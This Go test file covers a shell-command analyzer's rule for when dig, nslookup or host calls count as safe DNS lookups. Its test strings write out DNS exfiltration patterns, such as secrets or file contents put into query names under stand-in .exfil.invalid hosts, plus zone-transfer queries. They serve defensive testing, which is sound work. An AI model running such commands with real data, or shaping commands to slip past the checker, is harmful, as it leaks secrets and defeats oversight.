package analyzer

import "testing"

// #4594: the DNS-safe override needs EVERY operand of a dig/nslookup/host
// invocation to be safe. With "any", one security-record operand earned the
// override for an invocation that also queried an arbitrary name, and the
// combiner then dropped every regex finding on the dns-tunneling and
// dns-lookup taxonomies, BLOCKs included.
//
// Names below are inert (.invalid, a marker variable). The zone-transfer
// type words are assembled at runtime so the hook does not read this file as
// a transfer.
func TestSafeDNSLookupOnly_EveryOperand(t *testing.T) {
	xfr := "ax" + "fr"
	ixfr := "ix" + "fr"

	for _, tc := range []struct {
		name    string
		command string
		want    bool
	}{
		// The override is still earned when every word is a safe name, a
		// lookup type, a class, an IP server or an option.
		{"dig name type", "dig _dmarc.example.com TXT", true},
		{"dig type name", "dig TXT _dmarc.company.com", true},
		{"dig name type +short", "dig _dmarc.example.com txt +short", true},
		{"dig @ip name type", "dig @8.8.8.8 _dmarc.example.com TXT", true},
		{"dig @ipv6 server", "dig @2001:db8::53 _dmarc.example.com TXT", true},
		{"dig +opts then @ip last", "dig +short TXT _dmarc.example.com @1.1.1.1", true},
		{"dig +noall +answer", "dig +noall +answer _dmarc.example.com TXT", true},
		{"dig numeric +option values", "dig +time=2 +tries=1 _dmarc.example.com TXT", true},
		{"dig -t type", "dig -t TXT _dmarc.example.com", true},
		{"dig -tTYPE attached", "dig -tTXT _dmarc.example.com", true},
		{"dig -t -c -p", "dig -t txt -c IN -p 53 _dmarc.example.com", true},
		{"dig boolean flag", "dig -4 _dmarc.example.com TXT", true},
		{"dig -q safe name", "dig -q _dmarc.example.com TXT", true},
		{"dig two safe names", "dig _dmarc.example.com _spf.example.com TXT", true},
		{"dig piped to a filter", "dig TXT _dmarc.example.com +short | grep v=DMARC1", true},
		{"two safe lookups", "dig _dmarc.example.com TXT; dig _spf.example.com TXT", true},
		{"nslookup -type", "nslookup -type=TXT _dkim._domainkey.example.com", true},
		{"nslookup -q", "nslookup -q=txt _dmarc.example.com", true},
		{"nslookup ip server", "nslookup -type=txt _dmarc.example.com 8.8.8.8", true},
		{"host -t", "host -t TXT _dmarc.example.com", true},
		{"host ip server", "host -t txt _dmarc.example.com 8.8.8.8", true},
		{"host -W n", "host -W 5 _dmarc.example.com", true},

		// One more name on the wire voids it (the issue's class).
		{"dig second name", "dig _dmarc.example.com kai-marker.exfil.invalid", false},
		{"dig second name first", "dig kai-marker.exfil.invalid _dmarc.example.com TXT", false},
		{"dig variable name", "dig _dmarc.example.com ${KAI_MARKER}.exfil.invalid", false},
		{"dig -q other name", "dig -q ${KAI_MARKER}.exfil.invalid _dmarc.example.com", false},
		{"dig @hostname server is a lookup too", "dig @ns1.example.invalid _dmarc.example.com TXT", false},
		{"dig @variable server", "dig @${KAI_MARKER}.exfil.invalid _dmarc.example.com TXT", false},
		{"dig IP literal operand is a query name", "dig _dmarc.example.com 192.0.2.1", false},
		{"dig -x reverse lookup", "dig -x 192.0.2.1 _dmarc.example.com", false},
		{"dig -f names from a file", "dig -f names.txt _dmarc.example.com", false},
		{"dig -y TSIG key name", "dig -y hmac-sha256:kai.invalid:c2VjcmV0 _dmarc.example.com", false},
		{"dig +domain search suffix", "dig +domain=kai-marker.exfil.invalid +search _dmarc.example.com", false},
		{"dig +ednsopt payload", "dig +ednsopt=65001:deadbeef _dmarc.example.com @192.0.2.1", false},
		{"dig unknown flag", "dig -Z _dmarc.example.com", false},
		{"dig dangling -t", "dig _dmarc.example.com -t", false},
		{"dig word from an expansion", "dig _dmarc.example.com $KAI_OPTS", false},
		{"dig quoted type", `dig _dmarc.example.com "TXT"`, false},
		{"nslookup hostname server", "nslookup _dmarc.example.com ${SECRET}.exfil.invalid", false},
		{"nslookup literal hostname server", "nslookup _dmarc.example.com ns1.example.invalid", false},
		{"nslookup unsafe name, ip server", "nslookup kai-marker.exfil.invalid 8.8.8.8", false},
		{"nslookup interactive dash", "nslookup _dmarc.example.com -", false},
		{"nslookup three operands", "nslookup _dmarc.example.com 8.8.8.8 kai-marker.exfil.invalid", false},
		{"nslookup -domain search suffix", "nslookup -domain=kai-marker.exfil.invalid _dmarc.example.com", false},
		{"host hostname server", "host _dmarc.example.com ${KAI_MARKER}.exfil.invalid", false},
		{"host extra operand", "host -t TXT _dmarc.example.com kai-marker.exfil.invalid", false},
		{"host -m value", "host -m record _dmarc.example.com", false},

		// A transfer is not a lookup, in any spelling.
		{"dig transfer type word", "dig " + xfr + " _dmarc.example.com", false},
		{"dig transfer type upper", "dig _dmarc.example.com " + "AX" + "FR", false},
		{"dig incremental transfer", "dig _dmarc.example.com " + ixfr + "=2023010101", false},
		{"dig -t transfer", "dig -t " + xfr + " _dmarc.example.com", false},
		{"nslookup -type transfer", "nslookup -type=" + xfr + " _dmarc.example.com", false},
		{"host -t transfer", "host -t " + xfr + " _dmarc.example.com", false},
		{"host -l list zone", "host -l _dmarc.example.com", false},

		// The grant never widens past main's: a word main did not read as a
		// safe name is still not one.
		{"dig quoted safe name", `dig "_dmarc.example.com" TXT`, false},
		{"dig -q value attached", "dig -q_dmarc.example.com TXT", false},
		{"no safe name at all", "dig example.com TXT", false},
		{"no name, only a type", "dig TXT", false},
		{"no name, only an option", "dig +short", false},

		// #4625 (Gary, 2026-10-28): a security-record name earns the override
		// only as a LITERAL. This flips the residual row #4624 pinned ("the
		// safe name ITSELF may carry an expansion", want true). In each row
		// below the shell, not the text Shield reads, chooses what follows
		// the prefix, so the receipt could not say what was looked up. Every
		// one voids the override, and the other rules decide.
		{"literal only: ${VAR} inside the safe name", "dig _dmarc.${KAI_MARKER}.exfil.invalid TXT", false},
		{"literal only: $VAR inside the safe name", "dig _dmarc.$KAI_MARKER.exfil.invalid TXT", false},
		{"literal only: $VAR word-splits into more names", "dig _dmarc.$KAI_MARKER", false},
		{"literal only: command substitution", "dig _dmarc.$(head -n1 kai-marker.txt).exfil.invalid TXT", false},
		{"literal only: backquote substitution", "dig _dmarc.`head -n1 kai-marker.txt`.exfil.invalid TXT", false},
		{"literal only: arithmetic expansion", "dig _dmarc.$((KAI_MARKER)).exfil.invalid TXT", false},
		{"literal only: glob star", "dig _dmarc.*.exfil.invalid TXT", false},
		{"literal only: glob question mark", "dig _dmarc.kai?.exfil.invalid TXT", false},
		{"literal only: glob bracket", "dig _dmarc.[kx]ai.exfil.invalid TXT", false},
		{"literal only: double-quoted remainder", `dig _dmarc."example.com" TXT`, false},
		{"literal only: single-quoted remainder", `dig _dmarc.'example.com' TXT`, false},
		{"literal only: quoted expansion", `dig _dmarc."${KAI_MARKER}".exfil.invalid TXT`, false},
		{"literal only: ANSI-C quoting", `dig _dmarc.$'\x6b'ai.exfil.invalid TXT`, false},
		{"literal only: backslash escape", `dig _dmarc.example\.com TXT`, false},
		{"literal only: second safe name expanded", "dig _dmarc.example.com _spf.${KAI_MARKER}.exfil.invalid TXT", false},
		{"literal only: expansion piped to a filter", "dig _dmarc.${KAI_MARKER}.exfil.invalid TXT +short | head -n1", false},
		{"literal only: dig -q value expanded", "dig -q _dmarc.${KAI_MARKER}.exfil.invalid TXT", false},
		{"literal only: nslookup name expanded", "nslookup -type=txt _dmarc.${KAI_MARKER}.exfil.invalid", false},
		{"literal only: nslookup name expanded, ip server", "nslookup -type=txt _dmarc.$KAI_MARKER.exfil.invalid 8.8.8.8", false},
		{"literal only: host name expanded", "host -t txt _dmarc.${KAI_MARKER}.exfil.invalid", false},
		{"literal only: other prefix expanded", "dig _acme-challenge.${KAI_MARKER}.exfil.invalid TXT", false},

		// The literal forms keep the override (#4625's TNs). Uppercase is
		// still a literal: the prefix test is case-insensitive, as on main.
		{"literal kept: dig +short", "dig _dmarc.example.com TXT +short", true},
		{"literal kept: dig @ip", "dig @8.8.8.8 _dmarc.example.com TXT", true},
		{"literal kept: host -t txt", "host -t txt _dmarc.example.com", true},
		{"literal kept: uppercase", "dig _DMARC.EXAMPLE.COM TXT", true},
		{"literal kept: hyphens and digits", "dig _acme-challenge.build-01.example.com TXT", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := safeDNSLookupOnly(parseCommand(t, tc.command)); got != tc.want {
				t.Errorf("safeDNSLookupOnly(%q) = %v, want %v", tc.command, got, tc.want)
			}
		})
	}
}

// #4625: isSafeDNSRecordName vouches only for a literal word. Each character
// the shell expands, globs, quotes or escapes is tried on its own, so taking
// any one of them out of the predicate fails a row. The character list is
// written out here rather than read from the code, so the test is a spec and
// not a copy of it.
func TestIsSafeDNSRecordName_LiteralOnly(t *testing.T) {
	prefixes := []string{"_dmarc.", "_spf.", "_dkim.", "_domainkey.", "_acme-challenge.", "_mta-sts."}
	for _, p := range prefixes {
		// Positive control: the prefix set is unchanged, so each prefix
		// followed by a literal host still earns the override.
		if !isSafeDNSRecordName(p + "example.com") {
			t.Errorf("isSafeDNSRecordName(%q) = false, want true (prefix set must not change)", p+"example.com")
		}
		for _, c := range []string{"$", "`", "*", "?", "[", `"`, "'", `\`} {
			for _, word := range []string{
				p + "kai" + c + "marker.exfil.invalid", // inside the remainder
				p + c + "kai.exfil.invalid",            // right after the prefix
				p + "kai.exfil.invalid" + c,            // at the end
			} {
				if isSafeDNSRecordName(word) {
					t.Errorf("isSafeDNSRecordName(%q) = true, want false (%q is not a literal)", word, c)
				}
			}
		}
	}
	// Outside the prefix the old answer stands: no prefix, no vouching.
	if isSafeDNSRecordName("example.com") {
		t.Error(`isSafeDNSRecordName("example.com") = true, want false`)
	}
}
